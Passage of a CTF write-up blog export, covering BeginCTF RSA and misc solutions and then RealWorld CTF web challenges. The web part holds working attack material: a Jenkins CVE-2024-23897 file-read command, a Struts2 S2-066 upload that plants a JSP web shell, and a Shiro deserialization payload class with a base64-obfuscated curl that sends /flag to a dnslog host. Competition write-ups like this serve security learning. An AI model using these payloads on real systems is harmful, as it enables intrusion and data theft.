class="line">    puzzle_list.append(com)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> puzzle_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m,e,fake_n_list</span>):</span><br><span class="line"></span><br><span class="line">    fake_n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fake_n_list)):</span><br><span class="line">        fake_n *= fake_n_list[i]</span><br><span class="line"></span><br><span class="line">    really_n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(fake_n_list)-<span class="number">1</span>):</span><br><span class="line">        really_n *= fake_n_list[i]</span><br><span class="line"></span><br><span class="line">    c = <span class="built_in">pow</span>(m,e,really_n)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>,c)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;fake_n =&quot;</span>,fake_n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    fake_n_list = fakeN_list()</span><br><span class="line">    encrypt(m,e,fake_n_list)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c = 6451324417011540096371899193595274967584961629958072589442231753539333785715373417620914700292158431998640787575661170945478654203892533418902</span></span><br><span class="line"><span class="string">fake_n = 178981104694777551556050210788105224912858808489844293395656882292972328450647023459180992923023126555636398409062602947287270007964052060975137318172446309766581</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>先用yafu分解<code>fake_n</code>，然后一个一个试即可。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">c,e,phi,n</span>):</span><br><span class="line">    d = gmpy2.invert(e, phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    flag = long_to_bytes(m)</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c=<span class="number">6451324417011540096371899193595274967584961629958072589442231753539333785715373417620914700292158431998640787575661170945478654203892533418902</span></span><br><span class="line"></span><br><span class="line">N = [<span class="number">3429664037</span>,<span class="number">2290486867</span>,<span class="number">2333428577</span>,<span class="number">3417707929</span>,<span class="number">4098704749</span>,<span class="number">3278987191</span>,<span class="number">3965529989</span>,<span class="number">3716624207</span>,<span class="number">4267348123</span>,<span class="number">2507934301</span>,<span class="number">2215221821</span>,<span class="number">3389689241</span>,<span class="number">2446301969</span>,<span class="number">2590663067</span>,<span class="number">3107210929</span>,<span class="number">2361589081</span>,<span class="number">3859354699</span>]</span><br><span class="line"></span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> N:</span><br><span class="line">    n *= i</span><br><span class="line">    phi = (i-<span class="number">1</span>)*phi</span><br><span class="line">    flag = decode(c,e,phi,n)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;flag&quot;</span> <span class="keyword">in</span> flag <span class="keyword">or</span> <span class="string">b&quot;begin&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># b&#x27;begin&#123;y0u_f1nd_th3_re4l_n&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="PAD"><a href="#PAD" class="headerlink" title="PAD"></a>PAD</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random, math</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line">flag=flag[:<span class="number">64</span>]</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSA</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, m: <span class="built_in">int</span></span>):</span><br><span class="line">        self.p, self.q, self.e, self.m = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>), getRandomRange(<span class="number">1</span>,<span class="number">8</span>), m</span><br><span class="line">        self.n = self.p * self.q</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Publickey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (self.n, self.e,self.c)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        pad = PAD(m=self.m, e=<span class="number">0</span>)</span><br><span class="line">        pad.PAD()</span><br><span class="line">        self.c = (pad.e,<span class="built_in">pow</span>(pad.M, self.e, self.n))</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PAD</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, m: <span class="built_in">int</span>, e</span>):</span><br><span class="line">        self.e, self.m, self.mbits = e, m, m.bit_length()</span><br><span class="line">        <span class="keyword">if</span> e == <span class="number">0</span>:</span><br><span class="line">            self.e = getRandomRange(<span class="number">2</span>, <span class="number">7</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">PAD</span>(<span class="params">self</span>):</span><br><span class="line">        self.M = <span class="built_in">pow</span>(self.e, self.mbits) + <span class="built_in">pow</span>(self.m, self.e)</span><br><span class="line">GIFT = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;GIFT.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        rsa = RSA(m=GIFT)</span><br><span class="line">        rsa.Encrypt()</span><br><span class="line">        f.write(<span class="built_in">str</span>(rsa.Publickey()) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看<code>GIFT.txt</code>，有类似这样的数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(105489743033600776618404736924014082773234739025040235918547880079849719971737127359304073614094075884043630513694448370483208184306027684643273284267932051217742004175757404293643624264846421545917186078199365762796141089940330731024030929168374696605389962930325106070659194496163327222019090112724836643593, 1, (2, 26557762379124264922132214420209728936796452559751033517820166259647971200493029434772959145551662395540203237914969022639479368547265045300822940244603592956901947131088363115332681941180989239355596363143445708865429254462912210194997411474244175252940834791770566886483490068164580622099300335891131365129))</span><br></pre></td></tr></table></figure><p>结合上面源码分析，如果rsa的e&#x3D;1时，输出的c大概率是m。</p><p>对于<code>PAD</code>部分，很显然<code>pow(self.m, self.e)</code> 远大于 <code>pow(self.e, self.mbits)</code>，那当e&#x3D;2时，开根号取整即可得到flag。</p><p>这里需要考虑开根号后浮点数的精度问题，要用<code>gmpy2.isqrt</code>来开根号。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">m = <span class="number">26557762379124264922132214420209728936796452559751033517820166259647971200493029434772959145551662395540203237914969022639479368547265045300822940244603592956901947131088363115332681941180989239355596363143445708865429254462912210194997411474244175252940834791770566886483490068164580622099300335891131365129</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(gmpy2.isqrt(m))))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;begin&#123;8E6C79D2-E960-C57A-F3E4-A52BC827ED6B_Dragon_Year_happy!!!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="ezRsa"><a href="#ezRsa" class="headerlink" title="ezRsa"></a>ezRsa</h2><p>e很小，可以通过爆破k开平方得到m</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">7709388356791362098686964537734555579863438117190798798028727762878684782880904322549856912344789781854618283939002621383390230228555920884200579836394161</span></span><br><span class="line">c = <span class="number">5573755468949553624452023926839820294500672937008992680281196534187840615851844091682946567434189657243627735469507175898662317628420037437385814152733456</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = gmpy2.iroot(k*n+c,e)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(res[<span class="number">0</span>])[<span class="number">2</span>:]))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;begin&#123;quadr4ticresidue_i5_s0_3asy&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="real-check-in"><a href="#real-check-in" class="headerlink" title="real check in"></a>real check in</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">为了选手有更好的游玩体验请及时加入beginctf2024官方群,群号:612995005</span><br><span class="line"></span><br><span class="line">从catf1y的笔记本中发现了这个神秘的代码MJSWO2LOPNLUKTCDJ5GWKX3UN5PUEM2HNFXEGVCGL4ZDAMRUL5EDAUDFL5MU6VK7O5UUYMK7GEYWWZK7NE3X2===</span><br><span class="line"></span><br><span class="line">你能帮助我找到最后的flag吗?</span><br><span class="line"></span><br><span class="line">Author: BeginCTF2024</span><br><span class="line"></span><br><span class="line">Difficult: baby</span><br></pre></td></tr></table></figure><p>base32解码即可得到flag。</p><h2 id="Tupper"><a href="#Tupper" class="headerlink" title="Tupper"></a>Tupper</h2><p>把txt的内容拼接起来，可以得到一串数字</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getstr</span>(<span class="params">filename</span>):</span><br><span class="line">    a = <span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(a)</span><br><span class="line">    </span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;=<span class="number">672</span>:</span><br><span class="line">    flag+=getstr(<span class="string">&#x27;./tupper/&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.txt&#x27;</span>)</span><br><span class="line">    i+=<span class="number">4</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;14278193432728026049298574575557534321062349352543562656766469704092874688354679371212444382298821342093450398907096976002458807598535735172126657504131171684907173086659505143920300085808809647256790384378553780282894239751898620041143383317064727136903634770936398518547900512548419486364915399253941245911205262493591158497708219126453587456637302888701303382210748629800081821684283187368543601559778431735006794761542413006621219207322808449232050578852431361678745355776921132352419931907838205001184&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把这串数字放到 <a href="https://tuppers-formula.ovh/">Tupper’s Formula Tools</a> 画图，即可得到flag。</p><p><img src="/./BeginCTF/m_2_1.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> MISC </tag>
            
            <tag> CRYPTO </tag>
            
            <tag> BeginCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RealWorld wp</title>
      <link href="/RealWorld/"/>
      <url>/RealWorld/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Be-a-Security-Researcher"><a href="#Be-a-Security-Researcher" class="headerlink" title="Be-a-Security-Researcher"></a>Be-a-Security-Researcher</h2><p>信息收集，这是一个<code>Jenkins</code>的网站</p><p><img src="/./RealWorld/w_1_1.png"></p><p>微信搜这个网站的漏洞，可以得到<code>Jenkins 任意文件读取漏洞（CVE-2024-23897)</code></p><p><a href="https://mp.weixin.qq.com/s/ZIJYx5sYlpViWQFNUAoaHg">CVE-2024-23897｜Jenkins任意文件读取漏洞（POC）</a></p><p>先下载一个 <a href="http://jenkins:8080//jnlpJars/jenkins-cli.jar">jenkins-cli.jar</a></p><p>之后执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar jenkins-cli.jar -s http://47.96.171.129:8080/ who-am-i &quot;@/flag&quot;</span><br></pre></td></tr></table></figure><p>即可得到flag。</p><p><img src="/./RealWorld/w_1_2.png"></p><h2 id="Be-More-Elegant"><a href="#Be-More-Elegant" class="headerlink" title="Be-More-Elegant"></a>Be-More-Elegant</h2><p>Struts2 文件上传 S2-066</p><p>参考链接：<a href="https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/">Apache Struts2 文件上传分析(S2-066)</a></p><p>先看源码：</p><p><strong>JspFilter</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> be.more.elegant.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JspFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JspFilter</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> ((HttpServletRequest)request).getServletPath();</span><br><span class="line">        <span class="keyword">if</span> (path.startsWith(<span class="string">&quot;/views&quot;</span>) || !path.endsWith(<span class="string">&quot;jsp&quot;</span>) &amp;&amp; !path.endsWith(<span class="string">&quot;jspx&quot;</span>)) &#123;</span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(<span class="string">&quot;jsp not allowed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>HeaderIconAction</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> be.more.elegant;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.action.ServletRequestAware;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HeaderIconAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestAware</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">File</span> <span class="variable">UPLOAD_DIR</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(HeaderIconAction.class.getClassLoader().getResource(<span class="string">&quot;../../statics/&quot;</span>).getFile(), <span class="string">&quot;uploads&quot;</span>);</span><br><span class="line">    <span class="keyword">private</span> HttpServletRequest request;</span><br><span class="line">    <span class="keyword">private</span> String uploadedPath;</span><br><span class="line">    <span class="keyword">private</span> File fileUpload;</span><br><span class="line">    <span class="keyword">private</span> String fileUploadContentType;</span><br><span class="line">    <span class="keyword">private</span> String fileUploadFileName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HeaderIconAction</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;input&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">doUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">remoteAddr</span> <span class="operator">=</span> <span class="built_in">this</span>.request.getRemoteAddr();</span><br><span class="line">            <span class="type">String</span> <span class="variable">md5ForIp</span> <span class="operator">=</span> <span class="built_in">this</span>.md5Ip(remoteAddr);</span><br><span class="line">            <span class="type">File</span> <span class="variable">sandBox</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(UPLOAD_DIR, md5ForIp);</span><br><span class="line">            <span class="type">File</span> <span class="variable">fileToCreate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(sandBox, <span class="built_in">this</span>.fileUploadFileName);</span><br><span class="line">            FileUtils.copyFile(<span class="built_in">this</span>.fileUpload, fileToCreate);</span><br><span class="line">            <span class="built_in">this</span>.uploadedPath = <span class="string">&quot;statics/uploads/&quot;</span> + md5ForIp + <span class="string">&quot;/&quot;</span> + <span class="built_in">this</span>.fileUploadFileName;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">md5Ip</span><span class="params">(String ip)</span> <span class="keyword">throws</span> NoSuchAlgorithmException &#123;</span><br><span class="line">        <span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">        md.update(ip.getBytes());</span><br><span class="line">        <span class="type">byte</span>[] digest = md.digest();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">byte</span>[] var5 = digest;</span><br><span class="line">        <span class="type">int</span> <span class="variable">var6</span> <span class="operator">=</span> digest.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="number">0</span>; var7 &lt; var6; ++var7) &#123;</span><br><span class="line">            <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> var5[var7];</span><br><span class="line">            sb.append(String.format(<span class="string">&quot;%02x&quot;</span>, b &amp; <span class="number">255</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> File <span class="title function_">getFileUpload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.fileUpload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFileUpload</span><span class="params">(File fileUpload)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.fileUpload = fileUpload;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFileUploadContentType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.fileUploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFileUploadContentType</span><span class="params">(String fileUploadContentType)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.fileUploadContentType = fileUploadContentType;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getFileUploadFileName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.fileUploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFileUploadFileName</span><span class="params">(String fileUploadFileName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.fileUploadFileName = fileUploadFileName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUploadedPath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.uploadedPath;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">withServletRequest</span><span class="params">(HttpServletRequest httpServletRequest)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.request = httpServletRequest;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只能解析<code>/views</code>目录下的<code>.jsp</code>文件，因此把jsp马上传到<code>/views</code>。</p><p>Struts2的版本是<code>6.3.0</code>，这个版本的Struts2存在<code>S2-066</code>，在文件上传的时候可以路径穿越。</p><p>这里注意的是，上传时，要先用<code>fileUpload</code>参数上传成功一次，之后再用<code>FileUpload</code>上传，即可实现路径穿越。</p><p>jsp马：</p><figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"><span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">out.print(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">out.println(<span class="keyword">new</span> <span class="title class_">String</span>(b));</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/./RealWorld/w_2_1.png"></p><p>访问<code>/views/test.jsp</code>，即可rce，执行<code>/readflag</code>即可得到flag。</p><p><img src="/./RealWorld/w_2_2.png"></p><h2 id="Old-Shiro"><a href="#Old-Shiro" class="headerlink" title="Old-Shiro"></a>Old-Shiro</h2><p>反编译jar包，可以看到账号密码，还看到了Cookie有一个<code>rememberMe_rwctf_2024</code>，是Shiro反序列化的入口。</p><p>查看依赖有<code>cb-1.9.2</code>，接下来用cb链去打。</p><p>因为header长度的限制，不能发送过长的Cookie，payload的长度有限制。</p><p>把没用的header都去掉，<code>POST</code>改成<code>GET</code>，最终可以发送<code>2900</code>左右的字符，因此生成的payload长度要在<code>2900</code>以内。</p><p><strong>MyClassLoader</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClassLoader</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] cmdArray = &#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;&#123;echo,Y3VybCBgY2F0IC9mbGFnfGJhc2U2NGAuNmtxeGd2LmRuc2xvZy5jbg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>&#125;;</span><br><span class="line">            Runtime.getRuntime().exec(cmdArray);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>cmdArray</code>里主要执行的命令是</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl `cat /flag|base64`.6kqxgv.dnslog.cn</span><br></pre></td></tr></table></figure><p><strong>CommonsBeanutilsShiroPayload</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.CB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanutilsShiroPayload</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//1.构造TemplatesImpl对象，其中code就是读取第一步构造好的类加载器。</span></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\ctf_ide\\ysoserial-master\\target\\classes\\ysoserial\\MyClassLoader.class&quot;</span>));</span><br><span class="line">        System.out.println(code.length);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span 